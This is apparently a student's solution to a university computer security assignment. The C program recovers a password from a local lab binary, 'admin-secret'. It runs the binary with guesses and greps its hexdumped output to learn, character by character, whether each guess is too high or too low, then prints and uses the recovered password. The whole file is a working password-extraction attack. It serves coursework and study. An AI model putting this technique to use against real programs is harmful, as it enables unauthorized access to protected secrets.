// CE/CZ4062 Computer Security Assignment Solution 3
// By Jiang Huan, Li Yichang & Li Yueran, NTU SCE
// Created on 24 Oct, 2015

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_DIGIT 15
#define CMD "/home/alice/Public/admin-secret "
#define PATTERN_SUCCESS " | grep 'Secret:'"
#define PATTERN_LARGER " | hexdump -c | grep ' 017'"
#define PATTERN_SMALLER " | hexdump -c | grep ' 001'"
#define SUCCESS 0
#define LARGER 1
#define SMALLER 2
#define FAILURE 3

int decr(char*, int);
int test(char*, int);
int make_guess(char*, int);
void celebrate(char*, int);

int main(int argc, int* argv[]) {
  char guess[MAX_DIGIT + 1] = "zzzzzzzzzzzzzzz";
  int digit = 0;
  do {
    if (test(guess, LARGER) == SUCCESS) {
      if (decr(guess, digit) == FAILURE)
        if (make_guess(guess, digit) == SUCCESS) {
          celebrate(guess, digit);
          return 0;}
        else
          ++digit;
    }
    else if (test(guess, SMALLER) == SUCCESS) {
      guess[digit] += 1;
      if (make_guess(guess, digit) == SUCCESS) {
        celebrate(guess, digit);
        return 0;}
      else
        ++digit;
    }
    else {
      printf("FAILURE with guess %s, %d\n", guess, digit);
      return 0;}
  } while (digit < MAX_DIGIT);
  printf("Fail to find the password. DEBUG now! \n");
  return 0;
}

int decr(char* guess, int digit)
{
  if (digit < MAX_DIGIT && guess[digit] > 'a') {
    guess[digit] -= 1;
    return SUCCESS;
  }
  return FAILURE;
}

int test(char* guess, int type) {
  FILE *fp;
  char cmd[256], rst[256];
  strcpy(cmd, CMD);
  strcat(cmd, guess);
  strcat(cmd, (type == LARGER) ? PATTERN_LARGER : PATTERN_SMALLER);
  fp = popen(cmd, "r");
  if (fgets(rst, sizeof(rst) - 1, fp) != NULL) {
    pclose(fp);
    return SUCCESS;
  } else
    return FAILURE;
}

int make_guess(char* guess, int digit) {
  // guess[0] up to guess[digit] (digit + 1)
  FILE *fp;
  char cmd[256], rst[256];
  strcpy(cmd, CMD);
  strncat(cmd, guess, digit + 1);
  strcat(cmd, PATTERN_SUCCESS);
  fp = popen(cmd, "r");
  if (fgets(rst, sizeof(rst) - 1, fp) != NULL) {
    pclose(fp);
    return SUCCESS;
  } else
    return FAILURE;
}

void celebrate(char* guess, int digit) {
  char cmd[256];
  strncpy(cmd, guess, digit + 1);
  cmd[digit + 1] = '\0';
  printf("Password:  %s\n", cmd);
  strcpy(cmd, CMD);
  strncat(cmd, guess, digit + 1);
  strcat(cmd, PATTERN_SUCCESS);
  system(cmd);
}
